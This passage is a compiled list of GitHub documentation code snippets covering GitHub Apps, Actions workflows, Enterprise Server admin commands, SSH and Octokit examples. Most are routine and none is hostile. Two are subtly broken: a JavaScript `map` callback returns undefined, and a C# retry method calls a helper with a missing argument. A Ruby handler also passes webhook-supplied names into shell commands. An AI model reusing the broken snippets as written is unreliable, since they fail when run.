Handles the check run `requested_action` event\n    # See /webhooks/event-payloads/#check_run\n    def take_requested_action\n      full_repo_name = @payload['repository']['full_name']\n      repository     = @payload['repository']['name']\n      head_branch    = @payload['check_run']['check_suite']['head_branch']\n\n      if (@payload['requested_action']['identifier'] == 'fix_rubocop_notices')\n        clone_repository(full_repo_name, repository, head_branch)\n\n        # Sets your commit username and email address\n        @git.config('user.name', ENV['GITHUB_APP_USER_NAME'])\n        @git.config('user.email', ENV['GITHUB_APP_USER_EMAIL'])\n\n        # Automatically correct RuboCop style errors\n        @report = `rubocop '#{repository}/*' --format json --auto-correct`\n\n        pwd = Dir.getwd()\n        Dir.chdir(repository)\n        begin\n          @git.commit_all('Automatically fix Octo RuboCop notices.')\n          @git.push(\"https://x-access-token:#{@installation_token.to_s}@github.com/#{full_repo_name}.git\", head_branch)\n        rescue\n          # Nothing to commit!\n          puts 'Nothing to commit'\n        end\n        Dir.chdir(pwd)\n        `rm -rf '#{repository}'`\n      end\n    end\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variable using PowerShell (v6+)\nDESCRIPTION: This PowerShell script (version 6 and higher) sets an environment variable by appending a string to the `$env:GITHUB_ENV` file. The string is formatted as `{environment_variable_name}={value}`. UTF-8 encoding is used by default.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_32\n\nLANGUAGE: powershell\nCODE:\n```\n\"{environment_variable_name}={value}\" >> $env:GITHUB_ENV\n```\n\n----------------------------------------\n\nTITLE: Example GraphQL Response for Create Migration Source\nDESCRIPTION: This JSON snippet shows the expected response from the `createMigrationSource` mutation. It includes the ID, name, URL, and type of the created migration source.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data\": {\n    \"createMigrationSource\": {\n      \"migrationSource\": {\n        \"id\": \"MS_kgDaACQxYmYxOWU4Yi0wNzZmLTQ3NTMtOTdkZC1hNGUzZmYxN2U2YzA\",\n        \"name\": \"Azure Devops Source\",\n        \"url\": \"https://dev.azure.com\",\n        \"type\": \"AZURE_DEVOPS\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing the take_requested_action Method\nDESCRIPTION: This Ruby method `take_requested_action` handles the 'requested_action' event. It clones the repository, configures Git with the app's username and email, runs RuboCop with the `--auto-correct` option to automatically fix style errors, commits the changes, pushes the commit to GitHub using the installation token, and cleans up the repository directory.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\n    # Handles the check run `requested_action` event\n    # See /webhooks/event-payloads/#check_run\n    def take_requested_action\n      full_repo_name = @payload['repository']['full_name']\n      repository     = @payload['repository']['name']\n      head_branch    = @payload['check_run']['check_suite']['head_branch']\n\n      if (@payload['requested_action']['identifier'] == 'fix_rubocop_notices')\n        clone_repository(full_repo_name, repository, head_branch)\n\n        # Sets your commit username and email address\n        @git.config('user.name', ENV['GITHUB_APP_USER_NAME'])\n        @git.config('user.email', ENV['GITHUB_APP_USER_EMAIL'])\n\n        # Automatically correct RuboCop style errors\n        @report = `rubocop '#{repository}/*' --format json --auto-correct`\n\n        pwd = Dir.getwd()\n        Dir.chdir(repository)\n        begin\n          @git.commit_all('Automatically fix Octo RuboCop notices.')\n          @git.push(\"https://x-access-token:#{@installation_token.to_s}@github.com/#{full_repo_name}.git\", head_branch)\n        rescue\n          # Nothing to commit!\n          puts 'Nothing to commit'\n        end\n        Dir.chdir(pwd)\n        `rm -rf '#{repository}'`\n      end\n    end\n```\n\n----------------------------------------\n\nTITLE: Adding and Committing Action Metadata\nDESCRIPTION: Adds the `action.yml` file to the Git repository, commits the changes with the message \"Add action\", and pushes the changes to the remote repository. This makes the action metadata available for use in workflows.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngit add action.yml\ngit commit -m \"Add action\"\ngit push\n```\n\n----------------------------------------\n\nTITLE: Publishing an npm Package using npm publish\nDESCRIPTION: This command publishes the current directory as an npm package to the npm registry. It assumes that the current directory contains a valid `package.json` file with the necessary metadata for the package.  Before running this command, you must be logged in to the npm registry using `npm login`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/package_registry/publish_package.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm publish\n```\n\n----------------------------------------\n\nTITLE: Removing Git Remotes - Shell\nDESCRIPTION: Demonstrates how to remove a git remote using the `git remote remove <remote_name>` command.  This permanently deletes the specified remote from the local repository configuration.  Requires a git repository to be initialized and the specified remote name to exist.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/git/remove-git-remote.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n# Remove existing remotes\n$ git remote remove origin\n```\n\n----------------------------------------\n\nTITLE: Inspecting SSH_AUTH_SOCK Variable - Shell\nDESCRIPTION: This command prints the value of the `SSH_AUTH_SOCK` environment variable.  This variable indicates the path to the SSH agent socket, which is used for agent forwarding. The presence of a value confirms that agent forwarding is potentially working. If the variable is empty, agent forwarding is not active.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ echo \"$SSH_AUTH_SOCK\"\n# Print out the SSH_AUTH_SOCK variable\n> /tmp/ssh-4hNGMk8AZX/agent.79453\n```\n\n----------------------------------------\n\nTITLE: Analyzing Issues with Feedback Label using Copilot Chat\nDESCRIPTION: This snippet demonstrates how to use GitHub Copilot Chat to find issues with a specific label (e.g., \"feedback\") that have the most reactions and categorize them based on sentiment. This allows users to prioritize which feedback to address. It assumes labels are used to track user feedback in the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/functionality-analysis-and-feature-suggestions/analyzing-and-incorporating-user-feedback.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nFind the issues with the feedback label that have the most reactions, and categorize them based on sentiment.\n```\n\n----------------------------------------\n\nTITLE: Writing Math Expressions as Blocks with ```math Code Blocks\nDESCRIPTION: This snippet demonstrates how to write mathematical expressions as blocks using the ```math code block syntax.  This method does not require the use of $$ delimiters.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/writing-mathematical-expressions.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\n**The Cauchy-Schwarz Inequality**\n\n```math\n\\left( \\sum_{k=1}^n a_k b_k \\right)^2 \\leq \\left( \\sum_{k=1}^n a_k^2 \\right) \\left( \\sum_{k=1}^n b_k^2 \\right)\n```\n```\n\n----------------------------------------\n\nTITLE: Copying Private Key to Nagios User\nDESCRIPTION: This snippet demonstrates how to copy the generated private key to the Nagios user's home directory and set the correct ownership.  This allows Nagios to use the key for SSH authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nnagiosuser@nagios:~$ sudo cp .ssh/id_ed25519 /var/lib/nagios/.ssh/\nnagiosuser@nagios:~$ sudo chown nagios:nagios /var/lib/nagios/.ssh/id_ed25519\n```\n\n----------------------------------------\n\nTITLE: Setting Server to Evacuating State (ghe-spokesctl server set evacuating)\nDESCRIPTION: This subcommand of `ghe-spokesctl` sets a git server to the evacuating state. `git-server-UUID` should be replaced with the actual UUID of the server being evacuated.  Used during node evacuation to prevent data loss.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_50\n\nLANGUAGE: shell\nCODE:\n```\nghe-spokesctl server set evacuating git-server-UUID\n```\n\n----------------------------------------\n\nTITLE: Listing repository secrets via GitHub CLI\nDESCRIPTION: This snippet lists all secrets for a repository using the GitHub CLI. The `gh secret list` command displays the secrets. It requires GitHub CLI to be installed and authenticated.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh secret list\n```\n\n----------------------------------------\n\nTITLE: Rewriting authors and branches after Mercurial import (Shell)\nDESCRIPTION: This command rewrites the authors and branches of the imported Mercurial repository using a CSV file. It requires the path to the authors map file and the path to the temporary repository. Replace `/PATH/AUTHORS-MAP-FILE.csv` and `/PATH/REPO-NAME.git` with the actual file and repository paths.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit-import-rewrite --flavor hg --authors /PATH/AUTHORS-MAP-FILE.csv /PATH/REPO-NAME.git\n```\n\n----------------------------------------\n\nTITLE: Pushing the Team Foundation Version Control imported repository (Shell)\nDESCRIPTION: This command pushes the imported Team Foundation Version Control repository to GitHub Enterprise Server. It uses the `--mirror` option to ensure all refs are pushed. Replace `PUSH-URL-ON-GITHUB-ENTERPRISE` with the actual push URL on GitHub Enterprise.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngit push --mirror PUSH-URL-ON-GITHUB-ENTERPRISE\n```\n\n----------------------------------------\n\nTITLE: Configuring redirects with frontmatter in YAML\nDESCRIPTION: This YAML snippet demonstrates how to use the `redirect_from` frontmatter to redirect an old article URL to a new one. When a user navigates to `/content/get-started/all-about-commits`, they will be redirected to the page with the title \"Creating your first commit\". This is useful when an article's name or URL has changed.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/configuring-redirects.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: Creating your first commit\nredirect_from:\n  - /content/get-started/all-about-commits\n```\n\n----------------------------------------\n\nTITLE: Fetching Issues with Octokit.js\nDESCRIPTION: This JavaScript snippet uses Octokit.js to fetch issues from a GitHub repository. It sends a GET request to the `/repos/{owner}/{repo}/issues` endpoint, specifying the repository owner and name, and setting the `per_page` parameter to 2. It then extracts the title and author ID of each issue and logs them to the console. The code handles potential errors by logging the status and message of the error response. Requires Octokit.js library.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_18\n\nLANGUAGE: javascript\nCODE:\n```\ntry {\n  const result = await octokit.request(\"GET /repos/{owner}/{repo}/issues\", {\n    owner: \"REPO-OWNER\",\n    repo: \"REPO-NAME\",\n    per_page: 2,\n  });\n\n  const titleAndAuthor = result.data.map(issue => {title: issue.title, authorID: issue.user.id})\n\n  console.log(titleAndAuthor)\n\n} catch (error) {\n  console.log(`Error! Status: ${error.status}. Message: ${error.response.data.message}`)\n}\n```\n\n----------------------------------------\n\nTITLE: Cloning Starter Repo using GitHub CLI\nDESCRIPTION: This command clones the starter code repository associated with an assignment into a local directory. It requires the GitHub CLI and the GitHub Classroom extension. The default destination is the current directory, but the `--directory` flag can be used to specify a different location. If the directory does not exists, it will be created.\nSOURCE: https://github.com/github/docs/blob/main/content/education/manage-coursework-with-github-classroom/teach-with-github-classroom/using-github-classroom-with-github-cli.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh classroom clone starter-repo\n```\n\n----------------------------------------\n\nTITLE: Copying the generated SSH key from the Docker container\nDESCRIPTION: This command copies the generated SSH private key (`id_ed25519`) from the Docker container to the local machine. This key is used for authenticating SSH connections to the Docker container's Git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\ndocker cp data:/home/git/.ssh/id_ed25519 .\n```\n\n----------------------------------------\n\nTITLE: Extending the /data/user Filesystem\nDESCRIPTION: This command expands the `/data/user` filesystem after the appliance has been rebooted and the new storage allocation is detected. This command makes the newly allocated space available for user data.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nghe-storage-extend\n```\n\n----------------------------------------\n\nTITLE: Amending Commit: Git Commit Amend\nDESCRIPTION: This command amends the previous commit with the change made by `git rm --cached`. It's necessary to remove the file from the unpushed history.  The `-CHEAD` flag reuses the commit message from the original commit.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/about-large-files-on-github.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit --amend -CHEAD\n# Amend the previous commit with your change\n# Simply making a new commit won't work, as you need\n# to remove the file from the unpushed history as well\n```\n\n----------------------------------------\n\nTITLE: Overriding the Default Rebalancing Schedule\nDESCRIPTION: This snippet shows how to override the default hourly rebalancing schedule by defining a Systemd.time or cron expression using the `ghe-config` utility. This allows you to customize the rebalancing schedule, such as setting it to daily.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/rebalancing-cluster-workloads.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config app.cluster-rebalance.schedule {% ifversion ghes > 3.13 %}'daily'{% else %}'0 0 * * *'{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Fetching Data with Retry Logic in C#\nDESCRIPTION: This C# code snippet demonstrates fetching data from an API with retry logic and UI updates. It handles potential exceptions, implements an exponential backoff strategy, and uses a CancellationToken for cancellation. The method updates a status label on the UI to provide feedback on the progress.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/documenting-code/explaining-complex-algorithms-or-logic.md#_snippet_0\n\nLANGUAGE: csharp\nCODE:\n```\nprivate static readonly HttpClient _client = new HttpClient();\n\npublic async Task<string> FetchDataFromApiWithRetryAsync(string apiUrl, CancellationToken cancellationToken, int maxRetries, int cancellationDelay, Label statusLabel)\n{\n    var retryCount = 0;\n    using var cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);\n\n    while (retryCount < maxRetries)\n    {\n        try\n        {\n            cts.CancelAfter(cancellationDelay);\n            return await FetchDataFromApiAsync(cts.Token, statusLabel);\n        }\n        catch (Exception ex) when (!(ex is OperationCanceledException))\n        {\n            if (retryCount < maxRetries - 1) {\n                retryCount++;\n                int delay = (int)Math.Pow(2, retryCount) * 1000;\n                await Task.Delay(delay, cancellationToken);\n                UpdateStatusLabel($\"Retrying ({retryCount}/{maxRetries})...\", statusLabel);\n            } else {\n                throw new Exception($\"Failed to fetch data after {maxRetries} retries: {ex.Message}\", ex);\n            }\n        }\n    }\n\n    throw new OperationCanceledException(\"The operation was cancelled.\", cts.Token);\n}\n\nprivate async Task<string> FetchDataFromApiAsync(string apiUrl, CancellationToken cancellationToken, Label statusLabel)\n{\n    UpdateStatusLabel(\"Fetching data...\", statusLabel);\n\n    HttpResponseMessage response = await _client.GetAsync(apiUrl, cancellationToken);\n    response.EnsureSuccessStatusCode();\n    string data = await response.Content.ReadAsStringAsync();\n\n    UpdateStatusLabel(\"Data fetched.\", statusLabel);\n    return data;\n}\n\nprivate void UpdateStatusLabel(string message, Label statusLabel)\n{\n    if (statusLabel.InvokeRequired) {\n        statusLabel.BeginInvoke(new Action<string, Label>(UpdateStatusLabel), message, statusLabel);\n    } else {\n        statusLabel.Text = message;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Slow Database Queries\nDESCRIPTION: This set of commands extracts and analyzes slow database queries from the `exceptions.log` file. It identifies the top 10 slowest requests by URL, aiding in the diagnosis of database performance issues.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/troubleshooting-resource-allocation-problems.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngrep SlowRequest github-logs/exceptions.log | jq '.url' | sort | uniq -c | sort -rn | head\n```\n\n----------------------------------------\n\nTITLE: Creating Dockerfile for Pre-Receive Hook Environment\nDESCRIPTION: This Dockerfile creates a Debian-based environment with Git, bash, and curl installed. It removes a symlink that can cause errors when executing scripts in the custom environment. The resulting image can be used to build a pre-receive hook environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-environment.md#_snippet_0\n\nLANGUAGE: Dockerfile\nCODE:\n```\nFROM --platform=linux/amd64 debian:stable\nRUN apt-get update && apt-get install -y git bash curl\nRUN rm -fr /etc/localtime /usr/share/zoneinfo/localtime\n```\n\n----------------------------------------\n\nTITLE: Fetching Repository List\nDESCRIPTION: This Ruby snippet uses the Octokit client to fetch a list of repositories for the authenticated user. It calls the `repositories` method on the client object, which returns an array of repository objects.  It depends on a previously initialized Octokit client instance.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nrepos = client.repositories\n```\n\n----------------------------------------\n\nTITLE: Conditional Step Execution in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to conditionally execute a step in a GitHub Actions workflow based on an `if` condition. The step will only run if the environment variable `str` equals 'ABC' and the environment variable `num` equals 123.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  conditional:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        if: env.str == 'ABC' && env.num == 123\n```\n\n----------------------------------------\n\nTITLE: Upgrade URL Example\nDESCRIPTION: This snippet shows the structure of an upgrade URL that redirects users to the GitHub Marketplace to upgrade their plan. Replace `<LISTING_NAME>`, `<LISTING_PLAN_NUMBER>`, and `<CUSTOMER_ACCOUNT_ID>` with the appropriate values. This URL is used to display a button or banner in the app's UI.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/github-marketplace/using-the-github-marketplace-api-in-your-app/handling-plan-changes.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://www.github.com/marketplace/<LISTING_NAME>/upgrade/<LISTING_PLAN_NUMBER>/<CUSTOMER_ACCOUNT_ID>\n```\n\n----------------------------------------\n\nTITLE: Checking node adminaction state using nes get-node-adminaction\nDESCRIPTION: This snippet shows how to check the current `adminaction` state for a node using the `nes get-node-adminaction` command. Replace HOSTNAME with the hostname of the node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nnes get-node-adminaction HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Run Smee Client with Webhook Proxy URL\nDESCRIPTION: This shell command starts the Smee client and configures it to forward webhook events from a specified Smee channel to a local server. The `--url` option specifies the Smee channel URL, `--path` specifies the endpoint on the local server to which events should be forwarded, and `--port` specifies the port number on which the local server is listening.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nsmee --url YOUR_DOMAIN --path /event_handler --port 3000\n```\n\n----------------------------------------\n\nTITLE: Promoting replica to primary\nDESCRIPTION: This snippet shows how to promote the replica appliance to primary status and stop replication using the `ghe-repl-promote` command. This command is executed on the replica appliance intended to become the new primary.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/initiating-a-failover-to-your-replica-appliance.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nghe-repl-promote\n```\n\n----------------------------------------\n\nTITLE: Accessing Development Environment Secrets\nDESCRIPTION: This describes how to access development environment secrets within a GitHub Codespace.  It involves using the `echo` command in the terminal to display the value of a secret, emphasizing that secrets are available as environment variables within the codespace environment.  This assumes the user has write access to the codespace's repository for the secrets to be injected.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/reference/security-in-github-codespaces.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\necho $SECRET_NAME\n```\n\n----------------------------------------\n\nTITLE: Copying Files to/from Codespace using GitHub CLI\nDESCRIPTION: This command copies files between the local machine and a codespace. The `remote:` prefix indicates a file or directory on the codespace. The `-r` flag enables recursive copying for directories. Source and destination paths are specified as arguments.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace cp [-r] SOURCE(S) DESTINATION\n```\n\n----------------------------------------\n\nTITLE: Creating a network on GCP using gcloud\nDESCRIPTION: This command creates a new network on Google Cloud Platform using the gcloud compute command-line tool. The `--subnet-mode auto` flag automatically creates a subnet in each region.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-google-cloud-platform.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngcloud compute networks create NETWORK-NAME --subnet-mode auto\n```\n\n----------------------------------------\n\nTITLE: Starting SSH Agent (Alternative Syntax)\nDESCRIPTION: This snippet provides an alternative syntax to start the SSH agent in the background, often used on Windows systems. It ensures the SSH agent is running to manage private keys.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\n$ ssh-agent -s\n> Agent pid 59566\n```\n\n----------------------------------------\n\nTITLE: Versioning for all GHES versions in YAML\nDESCRIPTION: This YAML snippet versions an article for all supported versions of GitHub Enterprise Server (ghes) using the '*' wildcard.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: Downloading your license\nversions:\n  ghes: '*'\n```\n\n----------------------------------------\n\nTITLE: Defining Environment Name and URL - YAML\nDESCRIPTION: This snippet demonstrates how to define a job's environment with both a name and a URL. The `name` specifies the environment, and the `url` property provides a link to the environment's location (e.g., a deployment endpoint). The specified environment `production_environment` should exist in the repository settings.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-environments-for-jobs.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nenvironment:\n  name: production_environment\n  url: https://github.com\n```\n\n----------------------------------------\n\nTITLE: Find Largest Files in Codespace\nDESCRIPTION: This command finds and lists the top 10 largest files in the GitHub Codespaces environment. It helps identify files that are consuming significant storage space. The command uses `sudo` to search the entire file system.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-creation-and-deletion-of-codespaces.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nsudo find / -printf '%s %p\\n'| sort -nr | head -10\n```\n\n----------------------------------------\n\nTITLE: Rollback GitHub Enterprise Upgrade (Shell)\nDESCRIPTION: This command rolls back a GitHub Enterprise upgrade to a previous version using a specified upgrade package file (.pkg). The `--allow-patch-rollback` flag is required. Note that hotpatch package files (.hpkg) are not supported for rollback.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/command-line-utilities-ghe-upgrade-rollback.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-upgrade --allow-patch-rollback EARLIER-RELEASE-UPGRADE-PACKAGE.pkg\n```\n\n----------------------------------------\n\nTITLE: Starting GHES Replication on a Replica Node\nDESCRIPTION: This command initiates the replication of all datastores on a GHES replica node after `ghe-repl-setup` has been executed. It starts the replication process.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_75\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-start\n```\n\n----------------------------------------\n\nTITLE: Submitting SBOM with SPDX Dependency Submission Action (YAML)\nDESCRIPTION: This workflow demonstrates how to generate an SPDX 2.2 SBOM using the Microsoft SBOM Tool and submit it to the Dependency Submission API using the SPDX Dependency Submission Action. It includes steps to download and execute the SBOM tool, generate the SBOM, upload it as an artifact, and then submit it using the action.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/using-the-dependency-submission-api.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: SBOM upload\n\non:\n  workflow_dispatch:\n  push:\n    branches: [\"main\"]\n\njobs:\n  SBOM-upload:\n\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: write\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Generate SBOM\n      # generation command documentation: https://github.com/microsoft/sbom-tool#sbom-generation\n      run: |\n        curl -Lo $RUNNER_TEMP/sbom-tool https://github.com/microsoft/sbom-tool/releases/latest/download/sbom-tool-linux-x64\n        chmod +x $RUNNER_TEMP/sbom-tool\n        $RUNNER_TEMP/sbom-tool generate -b . -bc . -pn ${{ github.repository }} -pv 1.0.0 -ps OwnerName -nsb https://sbom.mycompany.com -V Verbose\n    - uses: {% data reusables.actions.action-upload-artifact %}\n      with:\n        name: sbom\n        path: _manifest/spdx_2.2\n    - name: SBOM upload\n      uses: advanced-security/spdx-dependency-submission-action@5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e\n      with:\n        filePath: \"_manifest/spdx_2.2/\"\n\n```\n\n----------------------------------------\n\nTITLE: Fetching Pull Request Comments with Octokit.rb\nDESCRIPTION: This snippet demonstrates how to retrieve comments associated with an entire Pull Request using the Octokit.rb library. It utilizes the `issue_comments` method, providing the repository name and Pull Request ID.  It iterates through the returned comments, extracting the username, post date, and comment body for each one. The code requires Octokit.rb and a personal access token (PAT) stored in the environment variable `MY_PERSONAL_TOKEN`.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/working-with-comments.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'octokit'\n\n# !!! DO NOT EVER USE HARD-CODED VALUES IN A REAL APP !!!\n# Instead, set and test environment variables, like below\nclient = Octokit::Client.new :access_token => ENV['MY_PERSONAL_TOKEN']\n\nclient.issue_comments(\"octocat/Spoon-Knife\", 1176).each do |comment|\n  username = comment[:user][:login]\n  post_date = comment[:created_at]\n  content = comment[:body]\n\n  puts \"#{username} made a comment on #{post_date}. It says:\\n'#{content}'\\n\"\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Git Repository\nDESCRIPTION: This snippet configures access to a Git repository using a username and password (personal access token). The username is set to `x-access-token`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  github-octocat:\n    type: git\n    url: https://github.com\n    username: x-access-token\n    password: ${{secrets.MY_GITHUB_PERSONAL_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Searching models by language code on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that support Spanish using the `language` qualifier with a two-character language code ('es').\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_7\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=language:es&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Repackage Git Repository on all Cluster Nodes (ghe-cluster-each)\nDESCRIPTION: This command repackages a Git repository with pruning on all nodes in a cluster configuration to prevent sensitive data from persisting on other nodes. It's intended to be run across all git servers in the cluster. Requires the USERNAME/REPONAME.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_65\n\nLANGUAGE: shell\nCODE:\n```\nghe-cluster-each -r git -- \"ghe-repo-gc --prune USERNAME/REPONAME\"\n```\n\n----------------------------------------\n\nTITLE: Path Qualifier with Regular Expression\nDESCRIPTION: This snippet shows how to match only a specific filename (and not part of the path) using a regular expression with the `path:` qualifier. It searches for files named `README.md`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_14\n\nLANGUAGE: text\nCODE:\n```\npath:/(^|\\/)README\\.md$/\n```\n\n----------------------------------------\n\nTITLE: Download trusted root with GitHub CLI\nDESCRIPTION: Downloads the trusted root information using the GitHub CLI (`gh`). This command retrieves the key material from Sigstore instances used by GitHub for both public and private repositories. The output is saved to a file named `trusted_root.jsonl`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngh attestation trusted-root > trusted_root.jsonl\n```\n\n----------------------------------------\n\nTITLE: NuGet: Clearing packageSources in nuget.config\nDESCRIPTION: This snippet demonstrates how to configure a `nuget.config` file to only use the specified private NuGet registry. By using the `< clear />` tag within the `<packageSources>` section, all default package sources are removed, ensuring that only the defined private registry is used.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_10\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" 